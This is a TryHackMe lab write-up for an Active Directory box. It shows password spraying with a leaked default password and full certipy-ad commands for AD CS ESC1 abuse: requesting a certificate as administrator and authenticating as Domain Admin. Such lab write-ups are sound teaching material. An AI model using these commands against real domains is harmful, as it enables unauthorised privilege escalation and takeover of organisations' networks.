# THM Ledger

> **Platform:** TryHackMe
> **OS:** Windows (Active Directory)
> **Domain:** `thm.local` — DC/host: `LABYRINTH`
> **Theme:** AD enumeration → password spraying → AD CS (ESC1) to Domain Admin.

> **Note on the target IP:** this is a TryHackMe box, so the VPN address rotated between sessions (`10.49.137.131`, `10.49.159.163`, `10.49.176.228`). Commands below keep the IP that was live when each step was run — substitute your current machine IP.

## Attack Path Overview

1. **Recon** – DC with an **AD CS** web/role endpoint (`thm-LABYRINTH-CA` on 443).
2. **Unauthenticated enumeration** – RID-brute (guest/null) builds a large user list; anonymous LDAP reveals a password sitting in a user **description** field: `CHANGEME2023!`.
3. **Password spray** – that password is valid for several users, including `SUSANNA_MCKNIGHT`.
4. **AD CS ESC1** – the `ServerAuth` template allows *Enrollee Supplies Subject* + Client Authentication, so any authenticated user can request a certificate as `administrator` and authenticate as Domain Admin.

## 5. AD CS ESC1 → Domain Admin

> You can start here directly once you have any valid domain credentials.

### Step 5.1 — Find vulnerable templates

```bash
# generic forms
certipy-ad find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC IP> -vulnerable -stdout
```

```bash
certipy-ad find \
  -u 'SUSANNA_MCKNIGHT@thm.local' \
  -p 'CHANGEME2023!' \
  -dc-ip "10.49.176.228" \
```

**ESC1**: the `ServerAuth` template allows the enrollee to supply the subject (`EnrolleeSuppliesSubject`), permits **Client Authentication**, requires no manager approval, and is enrollable by **Authenticated Users**. Any domain user can therefore request a certificate with an arbitrary SAN/UPN — e.g. `administrator`.

### Step 5.2 — Request a certificate as `administrator`

```bash
certipy-ad req \
    -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' \
    -dc-ip '10.49.176.228' -target 'labyrinth.thm.local' \
    -ca 'thm-LABYRINTH-CA' -template 'ServerAuth' \
    -upn 'administrator@thm.local'
```

- `-u ... -p ...` — credentials of the requesting user.
- `-dc-ip` — a DC for DNS lookups if needed.
- `-target ... -ca ...` — the CA hostname and CA name.
- `-template 'ServerAuth'` — the ESC1-vulnerable template.
- `-upn 'administrator@thm.local'` — the target identity embedded in the certificate SAN.

This produces `administrator.pfx`.

### Step 5.3 — Authenticate with the certificate → DA hash

```bash
certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.49.176.228'
```

## Lessons Learned

- **Null/guest sessions are gold on AD boxes** — RID brute builds a user list without any credentials.
- **Always read user `description` fields** over LDAP; initial/default passwords (`CHANGEME2023!`) are routinely left there.
- **One password + a big user list = spray.** `--continue-on-success` so you collect *every* match, not just the first.
- **Mind your `-d` flag.** A left-over domain value (`cicada.htb`) only mislabels output here, but on real sprays it can cause auth to fail outright — always match it to the box.
- **ESC1 is the fastest AD CS win:** *Enrollee Supplies Subject* + Client Authentication + enrollment for `Authenticated Users` ⇒ request a cert as `administrator` and authenticate as Domain Admin.
